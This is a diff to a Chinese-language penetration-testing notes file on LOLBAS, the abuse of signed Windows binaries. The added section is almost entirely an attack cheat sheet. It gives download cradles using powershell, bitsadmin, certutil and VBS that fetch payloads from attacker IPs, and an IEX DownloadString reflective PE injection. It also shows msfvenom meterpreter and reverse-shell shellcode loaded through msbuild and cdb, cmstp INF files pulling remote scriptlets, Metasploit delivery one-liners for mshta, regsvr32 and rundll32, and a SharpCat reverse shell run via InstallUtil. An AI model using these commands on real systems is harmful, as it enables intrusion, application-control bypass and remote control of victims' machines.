@@ -42,62 +42,168 @@ LOLBAS
 
 定义
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，是一种白利用方式，是在2013年DerbyCon由Christopher Campbell和Matt Graeber发现，最终Philip Goh提出的概念。
-
-这些程序一般有有Microsoft或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于内网渗透中。这些程序可能会被用于：下载安全恶意程序、执行恶意代码、绕过UAC、绕过程序控制等。
++ LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，是一种 **白利用** 方式。
++ 这些程序一般有Microsoft或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于 **内网渗透** 中。
++ 这些程序可能会被用于： **下载安全恶意程序** 、 **执行恶意代码** 、 **绕过UAC** 、 **绕过程序控制** 等。
 
 常见程序
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- bitsadmin.exe
-	+ 下载文件:``bitsadmin /transfer myDownLoadJob /download /priority normal "http://192.168.203.140/b.ps1" "E:\\phpstudy_pro\\WWW\\b.ps1"``
-- cdb.exe
-- certutil.exe
-    + 下载文件:``certutil -urlcache -split -f http://192.168.203.140/b.exe``
-- cmd.exe
-- cmstp.exe
-- csc.exe
-- cscript.exe
-	+ 第一种
-	
-	::
-	
-		echo Set Post = CreateObject("Msxml2.XMLHTTP") >>download.vbs
-		echo Set Shell = CreateObject("Wscript.Shell") >>download.vbs
-		echo Post.Open "GET","http://192.168.203.140/a.ps1",0 >>download.vbs
-		echo Post.Send() >>download.vbs
-		echo Set aGet = CreateObject("ADODB.Stream") >>download.vbs
-		echo aGet.Mode = 3 >>download.vbs
-		echo aGet.Type = 1 >>download.vbs
-		echo aGet.Open() >>download.vbs
-		echo aGet.Write(Post.responseBody) >>download.vbs
-		echo aGet.SaveToFile "D:/a.ps1",2 >>download.vbs
-	
-	+ 第二种：``echo set a=createobject(^"adod^"+^"b.stream^"):set w=createobject(^"micro^"+^"soft.xmlhttp^"):w.open^"get^",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2  >> downfile.vbs``
-	+ 下载文件：``cscript downfile.vbs http://192.168.203.140/a.ps1 D:\\tomcat8.5\\webapps\\x.ps1``
-	
-- expand.exe
-    + 展开一个或多个压缩文件
-- mofcomp.exe
-- msbuild.exe
-    + 构建应用程序
-- mshta.exe
-- netsh.exe
-- installutil.exe
-    + 安装/卸载程序组件
-- powershell.exe
-	+ 下载文件:``powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://45.32.1.7:80/download/file.exe','d:\yayou\Web\RYFront\system.exe')``
-	+ 下载文件:``powershell (new-object Net.WebClient).DownloadFile('http://192.168.203.140/a.ps1','E:\phpstudy_pro\WWW\a.ps1')``
-	+ 执行程序:``powershell Start-Process d:\yayou\Web\RYFront\system.exe``
-- psexec.exe
-- reg.exe
-- regedit.exe
-- regsvr32.exe
-- rundll32.exe
-- sc.exe
-- schtasks.exe
-- wmic.exe
-- windbg.exe
-- wscript.exe
++ 下载类
+	- ``powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://45.32.1.7:80/download/file.exe','d:\system.exe')``
+	- ``powershell (new-object Net.WebClient).DownloadFile('http://192.168.203.140/a.ps1','E:\phpstudy_pro\WWW\a.ps1')``
+	- ``bitsadmin /transfer myDownLoadJob /download /priority normal "http://192.168.203.140/b.ps1" "E:\\phpstudy_pro\\WWW\\b.ps1"``
+	- ``certutil -urlcache -split -f http://192.168.203.140/b.exe``
+	- cscript.exe
+		+ 第一种
+			::
+			
+				echo Set Post = CreateObject("Msxml2.XMLHTTP") >>download.vbs
+				echo Set Shell = CreateObject("Wscript.Shell") >>download.vbs
+				echo Post.Open "GET","http://192.168.203.140/a.ps1",0 >>download.vbs
+				echo Post.Send() >>download.vbs
+				echo Set aGet = CreateObject("ADODB.Stream") >>download.vbs
+				echo aGet.Mode = 3 >>download.vbs
+				echo aGet.Type = 1 >>download.vbs
+				echo aGet.Open() >>download.vbs
+				echo aGet.Write(Post.responseBody) >>download.vbs
+				echo aGet.SaveToFile "D:/a.ps1",2 >>download.vbs
+		+ 第二种：``echo set a=createobject(^"adod^"+^"b.stream^"):set w=createobject(^"micro^"+^"soft.xmlhttp^"):w.open^"get^",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2  >> downfile.vbs``
+		+ 下载文件：``cscript downfile.vbs http://192.168.203.140/a.ps1 D:\\tomcat8.5\\webapps\\x.ps1``
++ 程序编译类
+	- csc.exe
+		+ 在C:\Windows\Microsoft.NET\Framework64\v4.0.30319目录中,注意64位和32位
+		+ 编译C#代码：``csc.exe /out:C:\1.exe C:\1.cs``
+	- msbuild.exe
+		+ 在C:\Windows\Microsoft.NET\Framework64\v4.0.30319目录中，注意64位和32位
+		+ 地址：``https://github.com/3gstudent/msbuild-inline-task``
+		+ 使用说明：``https://3gstudent.github.io/Use-MSBuild-To-Do-More``
+		+ 构建Msfvenom生成CSharp文件
+			::
+			
+				生成代码：
+				msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f csharp
+				下载：https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml
+				替换其中的buf为shellcode，修改名字为file.csproj
+				编译：MSBuild.exe  file.csproj
+		+ 执行PE文件
+		+ 执行powershell命令
+				
++ 执行加载类
+	- Invoke-ReflectivePEInjection.old.ps1地址: ``https://github.com/clymb3r/PowerShell``
+	- ``powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.11:8000/Invoke-ReflectivePEInjection.old.ps1');Invoke-ReflectivePEInjection -PEUrl http://192.168.100.11:8000/shell.dll"``
+	- ``powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.11:8000/Invoke-ReflectivePEInjection.old.ps1');Invoke-ReflectivePEInjection -PEUrl http://192.168.100.11:8000/shell.exe``
+	- ``powershell Start-Process d:\yayou\Web\RYFront\system.exe``
+	- cdb.exe
+		+ windbg自带命令行调试工具，安装目录中。
+		+ 加载shellcode
+			::
+			
+				生成shellcode
+				msfvenom -p windows/x64/shell_reverse_tcp lhost=xxx.xxx.xxx.xxx lport=3333 -f python
+				转换shellcode为wds文件
+				使用工具：https://github.com/Ryze-T/cdb-wds
+				python3 shellcode2wds.py（脚本中buf内容改为shellcode）生成shell.wds
+				目标机器执行：cdb.exe -pd -cf shell.wds -o notepad.exe
+		+ 加载dll
+			::
+			
+				cdb附加到指定进程：cdb.exe -pd -pn notepad.exe
+				加载dll：.load C:\artifact.dll
+		+ 执行exe: ``cdb.exe -pd -pn notepad.exe -a "C:\artifact.exe"`` , ``g``
+		+ 执行shell：``cdb.exe -pd -pn notepad.exe`` , ``.shell cmd.exe /c whoami``
+	- cmstp.exe
+		+ windows自带程序，可以从远程服务器加载和执行DLL或COM脚本（SCT）。
+		+ 执行本地dll文件：
+			::
+			
+				cmstp.inf文件内容如下：
+				[version]
+				Signature=$chicago$
+				AdvancedINF=2.5
+				[DefaultInstall_SingleUser]
+				RegisterOCXs=RegisterOCXSection
+				[RegisterOCXSection]
+				C:\test.dll
+				[Strings]
+				AppAct = "SOFTWAREMicrosoftConnection Manager"
+				ServiceName="Pentestlab"
+				ShortSvcName="Pentestlab"
+				
+				执行：cmstp.exe /s /ns cmstp.inf
+		+ 直接执行程序：
+			::
+			
+				[version]
+				Signature=$chicago$
+				AdvancedINF=2.5
+				[DefaultInstall_SingleUser]
+				RegisterOCXs=RegisterOCXSection
+				[RegisterOCXSection]
+				C:\Windows\System32\calc.exe
+				[Strings]
+				AppAct = "SOFTWARE\Microsoft\Connection Manager"
+				ServiceName="Pentestlab"
+				ShortSvcName="Pentestlab"
+				
+				执行：cmstp.exe /ns /s cmstp.inf
+		+ 执行sct程序：
+			::
+			
+				sct生成：暂无
+				cmstp.inf文件内容如下：
+				[version]
+				Signature=$chicago$
+				AdvancedINF=2.5
+				[DefaultInstall_SingleUser]
+				UnRegisterOCXs=UnRegisterOCXSection
+				[UnRegisterOCXSection]
+				%11%scrobj.dll,NI,http://10.0.0.2/tmp/powersct.sct
+				[Strings]
+				AppAct = "SOFTWAREMicrosoftConnection Manager"
+				ServiceName="Pentestlab"
+				ShortSvcName="Pentestlab"
+				
+				执行：cmstp.exe /ns /s cmstp.inf
+	- mshta.exe
+		::
+		
+			use exploit/windows/misc/hta_server
+			set srvhost 192.168.0.104
+			exploit -j
+			
+			mshta.exe http://192.168.0.104:8080/SxUxU5AvkuW2LCX.hta
+	- regsvr32.exe
+		::
+		
+			use exploit/multi/script/web_delivery
+			set srvhost 192.168.1.121
+			set target 3
+			set payload windows/x64/meterpreter/reverse_tcp
+			set lhost 192.168.1.121
+			exploit –j
+			
+			regsvr32 /s /n /u /i:http://192.168.1.121:8080/yvj3GKJwvde.sct scrobj.dll
+	- rundll32.exe
+		::
+		
+			use exploit/windows/smb/smb_delivery
+			set srvhost 192.168.1.121
+			exploit -j
+			
+			rundll32.exe \\192.168.1.121\qFMnFO\test.dll,0
++ 其它
+	- expand.exe
+		+ 展开一个或多个压缩文件
+	- mofcomp.exe
+		+ 编译mof文件，并添加到wmi
+	- installutil.exe
+		::
+		
+			c#代码：https://github.com/Cn33liz/SharpCat/blob/master/SharpCat.cs
+			修改Main函数其中的回连地址指向攻击机IP和端口
+			攻击机开启监听：nc -l -p 5555
+			编译exe：C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /out:"C:\Utils\SharpCat.exe" /platform:anycpu "C:\Utils\SharpCat.cs"
+			运行：C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Utils\SharpCat.exe
 
 后门
 ----------------------------------------
